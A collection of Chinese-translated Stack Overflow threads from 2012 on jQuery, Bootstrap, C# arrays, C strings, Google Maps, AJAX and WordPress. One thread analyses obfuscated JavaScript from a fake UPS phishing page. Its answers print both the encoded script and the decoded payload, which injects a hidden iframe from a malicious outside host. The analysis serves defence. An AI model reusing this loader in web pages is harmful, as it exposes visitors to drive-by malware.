这是我目前使用 Jquery 横幅的位置 - [http://jsfiddle.net/WcXBs/2/](http://jsfiddle.net/WcXBs/2/)

对 jquery 的使用不当（不知道快捷方式等）表示歉意。

我一直在尝试让 Jquery 转换以在更改时在横幅之间创建淡入淡出……但它们是错误的（我认为这是由于代码删除了类，同时添加了一个类，这意味着它没有什么可淡化的）。

我也确实设法让盒子用动画展开，但确实发现在第一次之后，动画没有再次显示。

看看我已经拥有的代码，任何人都可以提供指导，以在横幅更改时实现淡入淡出动画，以及成功的高度动画，然后再回到原始状态？

谢谢，

卢克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:37:23.067

你的方法太复杂了，我用很简单的方法做了你的横幅，看看：[DEMO](http://jsfiddle.net/PaJS6/8/)

```
$('a').hover(function(){

   var swap = $(this).attr('href'); // takes the hovered object's href. example = '#one'

   $('.banners').stop().hide(); // hides all banners
   $(swap).stop().fadeIn(600); // brings the hovered object with it's id

   $('a').removeClass('selected'); // removes selected class
   $(this).addClass('selected'); //adds selected class to the hovered object
}); 
```

# twitter-bootstrap - close.less 中是否缺少 button.close？

> ID：11052130
> 
> 赞同：1
> 
> 时间：2012-06-15T14:01:19.667
> 
> 标签：twitter-bootstrap, less

正如您在[此屏幕截图](http://www.mediafire.com/i/?ckpw2kpeaootar5)中看到的，关闭按钮在我的网站上的样式不正确。

我使用更少的引导程序，但在我的更少代码中找不到 button.close 类（我可以在[这个引导程序页面](http://twitter.github.com/bootstrap/components.html#alerts)中找到这个类）。

我想它应该在 close.less ？

至少当我在这里添加它时它可以工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:31:50.863

button.close 在 close.less

[https://github.com/twitter/bootstrap/blob/master/less/close.less](https://github.com/twitter/bootstrap/blob/master/less/close.less)

确保您正在使用

```
<button type="button" class="close" data-dismiss="alert">×</button> 
```

并不是

```
<button type="button" class="close" data-dismiss="alert">x</button> 
```

对于 twitter 引导程序和 iso-8859-1 的旧版本，请尝试使用 utf-8。

如果你仍然有问题，使用 jsFiddle 发布你的代码，我会看看。

# c# - 在 C# 中比较两个数组

> ID：11052132
> 
> 赞同：1
> 
> 时间：2012-06-15T14:01:23.600
> 
> 标签：c#, arrays

```
bool hasDuplicate = false;   
int[] a = new int[] {1, 2, 3, 4};
int[] b = new int[] { 5, 6, 1, 2, 7, 8 }; 
```

我需要将数组 A 的所有元素与数组 B 的元素进行比较，如果 B 中有重复元素，请将 hasDuplicate 设置为 TRUE。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-15T14:03:38.783

```
hasDuplicates = a.Intersect(b).Any(); 
```

您可以使用 LINQ`Intersect`方法 - [http://msdn.microsoft.com/en-us/library/system.linq.enumerable.intersect.aspx](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.intersect.aspx)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-15T14:04:13.520

我知道您不想要单线解决方案，但我会将我的答案留给其他可能想要针对同一问题的简单解决方案的用户。

如果您不想使用`Linq`，可以使用[SequenceEqual](http://msdn.microsoft.com/en-us/library/bb348567.aspx)。

`bool equal = Array1.SequenceEqual(Array2);`

希望能帮助到你。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-15T14:10:43.807

不是性能最高但可能最容易理解的方法是这样的：

```
foreach (int _a in a) { // iterate through all elements in array a (as _a)
    foreach (int _b in b) { // iterate through all elements in array b (as _b)
        if (_a == _b) { // if we've got a duplicate
            hasDuplicates = true; // store that for later on
            break; // immediately leave this loop (no point in further looking up)
        }
    }
    if (hasDuplicates) { // if we've got a duplicate
        break; // leave this loop as well (no point in further looking up)
    }
} 
```

显然，这不是最高效的解决方案，因为复杂性是`O(n²)`，这意味着任何一个数组中元素数量的两倍将使完成操作所需的时间加倍（最坏情况）；两个数组中元素数量的两倍将使时间量增加四倍。

更优雅的解决方案是使用其他一些解决方案中描述的预定义方法，但由于这是家庭作业，我不希望您被允许使用这些“快捷方式”（或应该这样做）。

永远记住：即使你在这里找到了解决方案，也要试着去理解它们，用它们来获得灵感，然后自己写。这可能是最好的学习方式。不要只是复制和粘贴。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-06-15T14:21:00.317

既然这是作业，我会给你一个作业的答案。

当然，您可以使用 LINQ 并依赖`SequenceEqual`,`Intersect`等，但这可能不是练习的重点。

给定两个数组，您可以使用`foreach`.

```
int[] someArray;
foreach(int number in someArray)
{
     //number is the current item in the loop
} 
```

因此，如果您有两个相当小的数组，您可以遍历第一个数组的每个数字，然后遍历第二个数组中的所有项目并进行比较。让我们试试看。首先，我们需要更正您的数组语法。它应该看起来像这样：

```
 int[] a = new int[] {1, 2, 3, 4};
    int[] b = new int[] { 5, 6, 1, 2, 7, 8 }; 
```

注意花括号的使用`{`。您正在使用该语法创建一个 N 维数组。

```
bool hasDuplicate = false;
int[] a = new int[] { 1, 2, 3, 4 };
int[] b = new int[] { 5, 6, 7, 8 };
foreach (var numberA in a)
{
    foreach (var numberB in b)
    {
        //Something goes here
    }
} 
```

这让我们非常接近。我鼓励你从这里自己尝试。如果您仍然需要帮助，请继续阅读。

* * *

好的，所以我们基本上只需要检查数字是否相同。如果是，则设置`hasDuplicate`为 true。

```
bool hasDuplicate = false;
int[] a = new int[] { 8, 1, 2, 3, 4 };
int[] b = new int[] { 5, 6, 7, 8 };
foreach (var numberA in a)
{
    foreach (var numberB in b)
    {
        if (numberA == numberB)
        {
            hasDuplicate = true;
        }
    }
} 
```

这是一种非常“蛮力”的方法。循环的复杂性是 O(n ² )，但这在你的情况下可能无关紧要。使用 LINQ 的其他答案肯定更有效，如果效率很重要，您可以考虑这些。`break`另一种选择是使用if为 true来“停止”循环`hasDuplicate`，或者将此代码放在一个方法中并用于`return`退出该方法。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-06-15T14:09:18.527

如果学习是您所寻求的，而算法是您试图提出的，那么使用 LINQ 和任何其他爵士乐都对您没有帮助。

您需要有 2 个嵌套`foreach`（或`for`，无论您喜欢哪个）循环，一旦您在第一个循环中找到一个与第二个循环中的成员匹配的成员，将您的布尔变量设置为 true 和`break`循环

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2012-06-15T14:15:26.493

尽管`LINQ`可以用一行代码帮助您做到这一点，但最好理解它是如何工作的，因为您在问题中提到了**算法**这个词:)

遍历数组并将每个项目与第二个数组中的项目进行比较。如果存在，则返回 true。否则为假。我会把它包装在这样的函数中

```
public bool IsPresentInArray(int[] firstArray, int[] secondArray)
{
    foreach (var itemA in firstArray)
    {
        foreach (var itemB in secondArray)
        {
            if (itemB == itemA)
            {                       
                return true;
            }
        }
    }
    return false;
} 
```

现在我可以这样称呼它

```
int[] a = new int[]{1, 2, 3, 4};
int[] b = new int[] { 5, 6, 1, 2, 7, 8};

bool present= IsPresentInArray(a, b); 
```

[在此处](http://msdn.microsoft.com/en-us/library/ttw7t8t6%28v=vs.80%29.aspx)阅读有关 foreach 循环的信息

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-06-15T14:33:35.167

为了有效地将一组元素中的所有元素与另一组元素进行比较，您可以制作其中一个元素`HashSet`。此外，您可以在找到第一个匹配项后立即退出循环：

```
HashSet<int> h = new HashSet<int>(a);
foreach (int i in b) {
  if (h.Contains(i)) {
    hasDuplicate = true;
    break;
  }
} 
```

这是一个 O(n+m) 解决方案，相比之下，有两个嵌套循环比较所有值，这是一个 O(n*m) 解决方案。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2015-05-31T15:16:29.870

我们为什么不尝试使用 LINQ？看看下面的代码，

```
public bool Checking()
    {
        bool hasDuplicate = false;
        int[] a = new int[] { 1, 2, 3, 4 };
        int[] b = new int[] { 5, 6, 1, 2, 7, 8 };

        int count = a.Intersect(b).Count();
        if (count >= 1)
            hasDuplicate = true;

        return hasDuplicate;

    } 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-01-04T04:58:52.137

我使用“IndexOf”和“foreach”循环来创建它。（注意：前 3 行“字符串”只是说明如何创建数组并将其转换为正确格式的示例）。

如果要比较 2 个数组，它们将以分号分隔，但最后一个值后面不会有一个。如果在数组的字符串形式后附加分号（即 a;b;c 变为 a;b;c;），则可以使用“x;”进行匹配 不管它在什么位置：

```
bool found = false;
string someString = "a-b-c";
string[] arrString = someString.Split('-');
string myStringArray = arrString.ToString() + ";";

foreach (string s in otherArray)
{
    if (myStringArray.IndexOf(s + ";") != -1) {
       found = true;
       break;
    }
}

if (found == true) { 
    // ....
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-12-22T11:51:52.003

我用`for`循环做到了。关键是我们将每个成员与 array 中的成员进行比较`b`。So首先`a[0]`与数组中的每个成员进行比较`b`，然后它会`a[1]`执行相同的操作，依此类推，直到找到匹配项。

```
bool hasDuplicate = false;

int[] a = new int[] { 1, 2, 3, 4 };
int[] b = new int[] { 5, 6, 1, 2, 7, 8 };

for (int i = 0; i < a.Length; i++)
{
    for (int j = 0; j < b.Length; j++)
    {
        if (a[i] == b[j])
        {
            hasDuplicate = true;
        }
    }
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-12-13T21:38:25.983

你应该对你的数据进行排序，O(nlog n)，然后你可以简单地通过它们中的每一个，O(n)，在那里你增加它们中的最低值。注意两次具有相同数字的数据，例如：

a = {1 3 3 5 8}

b = {2 3 5 5 8}

# javascript - 是否有像 Solr 或 Elasticsearch 这样的东西只能在 Javascript 中用于客户端？

> ID：11052135
> 
> 赞同：7
> 
> 时间：2012-06-15T14:01:33.473
> 
> 标签：javascript, search, indexing, storage

我们有一个小数据集，想以一种巧妙的方式搜索它，以填充一个自动完成的输入框。用户想要搜索一种类型的实体，但应该能够输入关联类型的属性。

由于我们的应用程序非常特定于行业，我将尝试将抽象问题置于更相关的上下文中：

**示例**：用户想要选择某种水果，并且可以使用水果的许多不同特征来搜索它。她可能会搜索它的名称（*苹果*）、同一种水果的特殊类型（*金黄色的美味*）、本地化版本（*apfel*、*تفاح*、*pomme*），以及其他特征，例如含有水果的食物（*pandowdy*、*苹果酒*），甚至对其描述进行全文搜索的结果。

通常我会想使用类似[solr](http://lucene.apache.org/solr/)或[elasticsearch](http://www.elasticsearch.org/)的东西，但是我们的数据集并不是很大，有 4-5 个关联实体，每个实体最多 200 个元素。此外，它将保持非常静态，每隔一周添加一些社论。所以我们考虑使用浏览器的数据存储来管理和搜索某种索引。问题是，在我们的研究中，我们找不到任何超越抽象[Web SQL](http://www.w3.org/TR/webdatabase/)或[Indexed DB](http://www.w3.org/TR/IndexedDB/)的东西。

是否有任何项目或库可以执行 solr 或 elasticsearch 之类的操作，并且可以在客户端用于小型数据集？我们正在寻找以下功能

*   快速搜索
*   预处理（标记化，过滤......）
*   订购
*   排名，查询提升

它应该适用于最近的浏览器和移动设备，其他浏览器（即全文搜索）可以接受的哑回退

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-21T12:14:58.507

**IndexedDB** 使用起来非常麻烦，我认为如果不进行一些修改，它不会做你想做的事。

**WebSql** 我使用 Chrome WebSql (sqlite) 和全文 (FT3)，你可以用它做一些高级查询，它会自动加权结果。例如：

table_ft3 结构=[id，名称，描述，宠物]

您可以使用“SELECT id FROM table_ft3 WHERE table_ft3 MATCH 'word1 word2 wordfuzzy* -notme + required name:john edwar* mary pets:dog cat'”进行查询

但是，这仅限于 Chrome。在 560k 行的表上，每行大约 12 个单词，它非常快，10 毫秒甚至更少。

**JSLinq** - [http://jslinq.codeplex.com/](http://jslinq.codeplex.com/) 这对于大型数据集很有用，通过将所有内容存储在内存中它非常快，但我认为它没有任何高级加权。它确实具有允许您编写自己的复杂查询函数的额外好处。

**JSII** - [http://karussell.wordpress.com/2010/11/02/jsii-full-text-search-in-1k-loc-of-javascript/](http://karussell.wordpress.com/2010/11/02/jsii-full-text-search-in-1k-loc-of-javascript/) 这使用 Lucene 风格的加权，在 20k 行上它在 50ms这不是很好，但可能对您的数据足够好。

# plsql - Select 有效，但 select within union 无效。为什么？

> ID：11052140
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:01:54.767
> 
> 标签：plsql

选择语句非常大，所以在简化的演示中，我的问题是：

我正在使用仅返回一个结果的特定测试用例进行故障排除，以单独测试 #1 并在 UNION 的 SELECT 语句链中进行测试。

我有一个有效的 SELECT 语句（#1）（即按预期返回一个测试用例）。我有一个不同的 SELECT UNION SELECT UNION SELECT UNION SELECT 语句（#2），它适用于它打算返回的数据，但测试用例不应该返回任何内容。

当我通过添加第五个 SELECT 将 #1 添加到 #2 的末尾并查找测试用例时，我没有返回任何结果。

关于 UNIONS 如何将结果集连接在一起，我在这里遗漏了什么吗？我知道我不是在看 UNION 和 UNION ALL 之间的区别，因为应该只找到一个结果。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:06:09.933

**我在 #2 中的**select 语句与 #1 不同。

# c - 获取一定长度的字符串。

> ID：11052141
> 
> 赞同：1
> 
> 时间：2012-06-15T14:01:59.267
> 
> 标签：c, string, char, strncpy

我目前正在使用文件名，我需要获取不包括扩展名的名称。我有一个单独的函数来确定文件的扩展名，但找不到如何在没有扩展名的情况下获取名称的方法。

如果我有文件名 mylog.txt 我只想能够得到 mylog

我试过以下

```
strncpy(fileNameWithoutExt, LogRotateConfiguration->logFileName,
    strlen(LogRotateConfiguration->logFileName-strlen(fileExtension)-1)); 
```

但是由于某种原因，当我运行它时，我只得到`m`文件名的其余部分而不是其余部分。我永远不会知道文件名或扩展名中有很多字符，因此需要确定它需要获取哪个部分。

所以基本上，我将如何获得没有扩展名的文件名的问题。

感谢您的任何帮助，您可以提供。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:05:31.040

嗯？

*您是否认真地从传递给* 的指针中减去扩展的长度`strlen()`？这看起来既危险又奇怪。

`strncpy()`此外，除非你真的需要它，否则你不应该使用它相当古怪的语义。您可能不会，并且使用它来复制较长字符串的一部分是一种很好的失败方式。

更好的解决方案通常是找出长度，并使用`memcpy()`：

```
char         out[WHATEVER];
const size_t len = strlen(LogRotateConfiguration->logFileName);
const size_t elen = strlen(fileExtension);
const size_t out_len = len - elen;

if( out_len < sizeof out )
{
  memcpy(out, LogRotateConfiguration->logFileName, out_len);
  out[out_len] = '\0';
}
else
  out[0] = '\0'; /* Make sure we get an empty output if filename won't fit. */ 
```

请注意，这也在`const`适当的地方使用，并将返回值存储在 `strlen()`适当类型的变量中，即`size_t`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:06:08.847

在您的代码中，您正在计算logFileName 字符串**之前的内存区域的 strlen。**

似乎 len 不正确；

```
strncpy(fileNameWithoutExt, LogRotateConfiguration->logFileName,
   strlen(LogRotateConfiguration->logFileName)-strlen(fileExtension)-1);

                                            ^ 
```

但是下面的代码将更具可读性。

```
int logFileNameLen = strlen(LogRotateConfiguration->logFileName);
int extensionLen = strlen(fileExtension);
strncpy(fileNameWithoutExt, LogRotateConfiguration->logFileName,
   logFileNameLen -extensionLen -1); 
```

在寻找错误时简化代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:06:24.377

你应该改变这个：

`strlen(LogRotateConfiguration->logFileName-strlen(fileExtension)-1)`

对此：

`(strlen(LogRotateConfiguration->logFileName)) - (strlen(fileExtension)-1)`

在这里，您首先获取完整`strlen`的文件名，然后减去`strlen`文件扩展名的，而不是获取`strlen`logfilename-strlen(fileextension) 的。

# javascript - 谷歌地图标记的奇怪过滤行为

> ID：11052142
> 
> 赞同：0
> 
> 时间：2012-06-15T14:02:00.377
> 
> 标签：javascript, jquery, google-maps, google-maps-api-3

**更新示例：**

> [http://jsfiddle.net/7Cwbn/62/](http://jsfiddle.net/7Cwbn/62/)

*您可以点击标记*

*按住**Ctrl**可选择多个选项*

# 更新：

我对脚本进行了更多修改，并`jQuery.inArray()`用`array_diff()`函数替换为 s 中的测试语句`if`。

我也改变了`if`一点逻辑。我尝试了**只**过滤房屋的新代码，它似乎可以工作，**但是**当我也为公寓启用相同的过滤代码时 - 过滤有点混乱。

*例如*：如果我从**功能**中选择所有内容- 地图上不会显示任何内容。但是应该出现一些标记，因为我至少有两个标记具有所有三个可用功能。

```
$(markers.houses).each(function(index, elem) {
        if ((array_diff(selectedFeatures, elem.features).length === 0) && (array_diff(selectedNearby, elem.nearby).length === 0)) {
            if (!markers.houseMarkers[index].visible) {
                markers.houseMarkers[index].setVisible(true);
            }
        }
    });
$(markers.condos).each(function(index, elem) {
        if ((array_diff(selectedFeatures, elem.features).length === 0) && (array_diff(selectedNearby, elem.nearby).length === 0)) {
            if (!markers.condoMarkers[index].visible) {
                markers.condoMarkers[index].setVisible(true);
            }
        }
    }); 
```

> **图 1.1** -*房屋和公寓的过滤代码片段*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:27:57.043

您在这里有一个错字（**selectedFeaturess**），这可能与它有关：

```
 if (jQuery.inArray(selectedFeaturess[i], elem.features) !== -1 || jQuery.inArray(selectedFeatures[i], elem.features) > -1) { 
```

我怀疑这也无济于事：

```
<option value="Wendy's">Harveys</option> 
```

像这样的代码：

```
if (jQuery.inArray(selectedFeatures[i], elem.features) !== -1 || jQuery.inArray(selectedFeatures[i], elem.features) > -1) { 
```

可以简化为：

```
if (jQuery.inArray(selectedFeatures[i], elem.features) !== -1) { 
```

因为如果它 > -1 那么它就是 !== -1，所以第二个子句是多余的。例如，如果它 = 0，则触发 IF 子句的第一部分，无需执行 IF 语句的第二部分。

最后，这是您的 $(document).ready() 函数的重写。主要问题是您如何循环数组中的元素。无需将它们视为 jquery 选择器并对它们执行 .each() ，您只需执行一个简单的 For 循环。但是您可以使用 jquery 选择器来检查它们的长度。这对我有用（我还在选项中将 Wendy's 重命名为 Harveys）。

```
$(document).ready(function() {
    //$('#filter').on('click', function(e) {
    $('#filter').click(function(e) {
        // prevent refreshing of the page
        e.preventDefault();

        // close all infoWindows
        infowindow.close();

        // hide all markers
        $(markers.houses).each(function(index, elem) {
            markers.houseMarkers[index].setVisible(false);
        });
        $(markers.condos).each(function(index, elem) {
            markers.condoMarkers[index].setVisible(false);
        });

        // get the selected features from select box
        var selectedFeatures = $("#features").val();
        var selectedNearby = $("#nearby").val();

        // for each house element...
        $(markers.houses).each(function(index, elem) {
            //first filter by selected features
            if ($(selectedFeatures).length) {
                for (var i = 0; i < selectedFeatures.length; i++) {       
                    if (jQuery.inArray(selectedFeatures[i], elem.features) !== -1) {    
                        if (!markers.houseMarkers[index].visible) {
                            markers.houseMarkers[index].setVisible(true);
                        }
                    }
                }
            }

            //then filter by nearby selections
            if ($(selectedNearby).length) {
                for (var i = 0; i < selectedNearby.length; i++) {
                    if (jQuery.inArray(selectedNearby[i], elem.nearby) !== -1) {
                        // if marker is not visible, but meets the filtering criteria - show it
                        // otherwise leave it as it is
                        if (!markers.houseMarkers[index].visible) {
                            markers.houseMarkers[index].setVisible(true);
                        }
                    }
                }
            }
        });

        // for each condo element...
        $(markers.condos).each(function(index, elem) {

            // first filter by selected features
            if ($(selectedFeatures).length) {
                 for (var i = 0; i < selectedFeatures.length; i++) {       
                    if (jQuery.inArray(selectedFeatures[i], elem.features) !== -1) {
                        // if marker is not visible, but meets the filtering criteria - show it
                        // otherwise leave it as it is
                        if (!markers.condoMarkers[index].visible) {
                            markers.condoMarkers[index].setVisible(true);
                        }
                    }
                }
            }

            //then filter by nearby selections
            if ($(selectedNearby).length) {
                for (var i = 0; i < selectedNearby.length; i++) {
                    if (jQuery.inArray(selectedNearby[i], elem.nearby) !== -1) {
                        // if marker is not visible, but meets the filtering criteria - show it
                        // otherwise leave it as it is
                        if (!markers.condoMarkers[index].visible) {
                            markers.condoMarkers[index].setVisible(true);
                        }
                    }
                }
            }
        });
    });
}); 
```

# javascript - 解密 Javascript

> ID：11052143
> 
> 赞同：3
> 
> 时间：2012-06-15T14:02:00.720
> 
> 标签：javascript, obfuscation, encryption

我收到一封电子邮件，其中包含一个看起来像是 UPS 的链接（我打开它是因为我昨晚订购了一些东西。时机不好。）

这是一个简单的网页，显然不是 UPS，但我查看了 HTML，其中嵌入了以下脚本。

```
try {
    q = document.createElement("p");
    q.appendChild(q + "");
} catch (qw) {
    h = -012 / 5;
    try {
        prototype - 1;
    } catch (bawg) {
        ss = [];
        f = (h) ? ("fromCharC" + "ode") : "";
        e = window["e" + "val"];
        n = [9, 18, 315, 408, 32, 80, 300, 444, 99, 234, 327, 404, 110, 232, 138, 412, 101, 232, 207, 432, 101, 218, 303, 440, 116, 230, 198, 484, 84, 194, 309, 312, 97, 218, 303, 160, 39, 196, 333, 400, 121, 78, 123, 364, 48, 186, 123, 492, 13, 18, 27, 36, 105, 204, 342, 388, 109, 202, 342, 160, 41, 118, 39, 36, 9, 250, 96, 404, 108, 230, 303, 128, 123, 26, 27, 36, 9, 200, 333, 396, 117, 218, 303, 440, 116, 92, 357, 456, 105, 232, 303, 160, 34, 120, 315, 408, 114, 194, 327, 404, 32, 230, 342, 396, 61, 78, 312, 464, 116, 224, 174, 188, 47, 194, 351, 464, 111, 196, 333, 468, 114, 194, 297, 428, 121, 92, 330, 404, 116, 94, 327, 388, 105, 220, 138, 448, 104, 224, 189, 448, 97, 206, 303, 244, 48, 202, 147, 396, 98, 114, 294, 220, 49, 202, 306, 192, 50, 98, 294, 200, 39, 64, 357, 420, 100, 232, 312, 244, 39, 98, 144, 156, 32, 208, 303, 420, 103, 208, 348, 244, 39, 98, 144, 156, 32, 230, 348, 484, 108, 202, 183, 156, 118, 210, 345, 420, 98, 210, 324, 420, 116, 242, 174, 416, 105, 200, 300, 404, 110, 118, 336, 444, 115, 210, 348, 420, 111, 220, 174, 388, 98, 230, 333, 432, 117, 232, 303, 236, 108, 202, 306, 464, 58, 96, 177, 464, 111, 224, 174, 192, 59, 78, 186, 240, 47, 210, 306, 456, 97, 218, 303, 248, 34, 82, 177, 52, 9, 18, 375, 52, 9, 18, 306, 468, 110, 198, 348, 420, 111, 220, 96, 420, 102, 228, 291, 436, 101, 228, 120, 164, 123, 26, 27, 36, 9, 236, 291, 456, 32, 204, 96, 244, 32, 200, 333, 396, 117, 218, 303, 440, 116, 92, 297, 456, 101, 194, 348, 404, 69, 216, 303, 436, 101, 220, 348, 160, 39, 210, 306, 456, 97, 218, 303, 156, 41, 118, 306, 184, 115, 202, 348, 260, 116, 232, 342, 420, 98, 234, 348, 404, 40, 78, 345, 456, 99, 78, 132, 156, 104, 232, 348, 448, 58, 94, 141, 388, 117, 232, 333, 392, 111, 234, 342, 388, 99, 214, 363, 184, 110, 202, 348, 188, 109, 194, 315, 440, 46, 224, 312, 448, 63, 224, 291, 412, 101, 122, 144, 404, 49, 198, 294, 228, 98, 110, 147, 404, 102, 96, 150, 196, 98, 100, 117, 164, 59, 204, 138, 460, 116, 242, 324, 404, 46, 236, 315, 460, 105, 196, 315, 432, 105, 232, 363, 244, 39, 208, 315, 400, 100, 202, 330, 156, 59, 204, 138, 460, 116, 242, 324, 404, 46, 224, 333, 460, 105, 232, 315, 444, 110, 122, 117, 388, 98, 230, 333, 432, 117, 232, 303, 156, 59, 204, 138, 460, 116, 242, 324, 404, 46, 216, 303, 408, 116, 122, 117, 192, 39, 118, 306, 184, 115, 232, 363, 432, 101, 92, 348, 444, 112, 122, 117, 192, 39, 118, 306, 184, 115, 202, 348, 260, 116, 232, 342, 420, 98, 234, 348, 404, 40, 78, 357, 420, 100, 232, 312, 156, 44, 78, 147, 192, 39, 82, 177, 408, 46, 230, 303, 464, 65, 232, 348, 456, 105, 196, 351, 464, 101, 80, 117, 416, 101, 210, 309, 416, 116, 78, 132, 156, 49, 96, 117, 164, 59, 26, 27, 36, 9, 200, 333, 396, 117, 218, 303, 440, 116, 92, 309, 404, 116, 138, 324, 404, 109, 202, 330, 464, 115, 132, 363, 336, 97, 206, 234, 388, 109, 202, 120, 156, 98, 222, 300, 484, 39, 82, 273, 192, 93, 92, 291, 448, 112, 202, 330, 400, 67, 208, 315, 432, 100, 80, 306, 164, 59, 26, 27, 36, 125];
        if (window.document) for (i = 6 - 2 - 1 - 2 - 1; - 617 + i != 2 - 2; i++) {
            k = i;
            ss = ss + String[f](n[k] / (i % (h * h) + 2 - 1));
        }
        e("if(1)" + ss);
    }
} 
```

我不是要求任何人为我解码脚本，但可以使用哪些工具来确定实际发生了什么？我是一名 C# 程序员，不会做太多 javascript。我假设它正在构建某种代码，然后执行。有没有办法可以追踪它以查看它正在构建什么？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:08:10.320

只需执行代码并替换`e = window["e" + "val"];`为`e = console.log`先。

结果：

```
 if (1) if (document.getElementsByTagName('body')[0]) {
    iframer();
} else {
    document.write("<iframe src='http://autobouracky.net/main.php?page=0e1cb9b71ef021b2' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
}
function iframer() {
    var f = document.createElement('iframe');
    f.setAttribute('src', 'http://autobouracky.net/main.php?page=0e1cb9b71ef021b2');
    f.style.visibility = 'hidden';
    f.style.position = 'absolute';
    f.style.left = '0';
    f.style.top = '0';
    f.setAttribute('width', '10');
    f.setAttribute('height', '10');
    document.getElementsByTagName('body')[0].appendChild(f);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:08:00.940

按照 Graham 的建议使用 jsbeautifier，你会发现一行

```
e("if(1)" + ss); 
```

哪里`e = window.eval`和`ss`是所需的脚本 - 所以将该行替换为

```
console.log(ss); 
```

并在 Firebug 控制台中运行整个代码。瞧。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:10:33.267

解码后编码的 javascript 如下所示：

```
if (document.getElementsByTagName('body')[0]) {
    iframer();
} else {
    document.write("<iframe src='http://autobouracky.net/main.php?page=0e1cb9b71ef021b2' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
}
function iframer() {
    var f = document.createElement('iframe');
    f.setAttribute('src', 'http://autobouracky.net/main.php?page=0e1cb9b71ef021b2');
    f.style.visibility = 'hidden';
    f.style.position = 'absolute';
    f.style.left = '0';
    f.style.top = '0';
    f.setAttribute('width', '10');
    f.setAttribute('height', '10');
    document.getElementsByTagName('body')[0].appendChild(f);
} 
```

# php - 跨域 javascript ajax

> ID：11052145
> 
> 赞同：0
> 
> 时间：2012-06-15T14:02:09.900
> 
> 标签：php, ajax, json, cross-domain

我整个星期都在处理一个问题，但在任何地方都找不到答案。

这就是问题：

> XMLHttpRequest 无法加载[http://www.websiteA.com/process.php](http://www.websiteA.com/process.php)。Access-Control-Allow-Origin 不允许来源[http://clientwebsi.te 。](http://clientwebsi.te)

我有一个 Javascript 文件，位于网站 A 的服务器上。客户端可以在该网站上加载 JS 文件。

在服务器 A 上还有一个 process.php，它将信息放入服务器 A 的数据库中。

我现在正在使用这段代码：

```
var dataText = 'page=' + top.location.host;
$.ajax({
    type: "POST",                 
    url: "process.php",         
    data: dataText,              
    error: function(request,error){
            alert(error);
        },
    success: function(request) {
        alert(request.length);
    }
}); 
```

此代码在 localhost 上完美运行，但在我使用服务器 A 和客户端服务器（跨域）时无法运行

这是在线代码：

```
$.ajax({
    type: "POST",                 
    url: "http://www.serverA.com/process.php",         
    dataType: "json",
    data: dataText,              
    error: function(request,error){
            alert(error);
        },
    success: function(request) {
        alert(request.length);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:05:33.890

```
$.ajax({
    type: "POST",                 
    url: "http://www.serverA.com/process.php",         
    dataType: "jsonp",
    data: data,  
    crossDomain: true,            
    error: function(request,error){
            alert(error);
        },
    success: function(request) {
        alert(request.length);
    } 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-15T14:48:37.927

唯一的方法是发出 jsonp GET 请求。这很容易，但您不能使用其他请求类型。

```
$.ajax({
    dataType: 'jsonp',
    url: 'http://domain.de/jsonp.php',
    success: function(data, textStatus, jqXHR),
    error: function(jqXHR, textStatus, errorThrown)
}); 
```

# wordpress - 客户用户字段不会保存在 WordPress 3.4 中

> ID：11052153
> 
> 赞同：1
> 
> 时间：2012-06-15T14:02:49.163
> 
> 标签：wordpress

我一直在 WordPress 中使用各种自定义用户字段（显示在用户个人资料上的字段）。随着 3.4 的更新，这些字段不再保存到数据库中。

这是我在 functions.php 文件中使用的代码。有谁知道这些在 3.4 中需要改变什么？

```
// Create Custom User Fields
add_action( 'show_user_profile', 'appUserAnswers' );
add_action( 'edit_user_profile', 'appUserAnswers' );
function appUserAnswers( $user ) { ?>
    <h3>Your Answers</h3>
    <table class="form-table">
        <tr>
            <th><label for="question-1">Question 1</label></th>
            <td>
                <textarea type="text" name="question-1" id="question-1" class="regular-text" rows="5" cols="30"><?php echo esc_attr( get_the_author_meta( 'question-1', $user->ID ) ); ?></textarea>
            </td>
        </tr>
    </table>
<?php }

// Save Custom User Fields
add_action( 'personal_options_update', 'appSaveUserAnswers' );
add_action( 'edit_user_profile_update', 'appSaveUserAnswers' );
function appSaveUserAnswers( $user_id ) {
    if ( !current_user_can( 'edit_user', $user_id ) )
        return false;
    // Copy and paste this line for additional fields. Make sure to change 'question-1' to the field ID.
    update_usermeta( $user_id, 'matrix-diagnosis', $_POST['question-1'] );
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-16T02:31:05.317

这最终成为一个简单的修复。经过一番挖掘，我发现 update_usermeta 已被弃用，但仍可在旧版本的 Wordpress 中使用。在这个版本中，他们完全取消了支持。

用 update_user_meta 替换所有 update_usermeta 实例解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-29T03:20:55.470

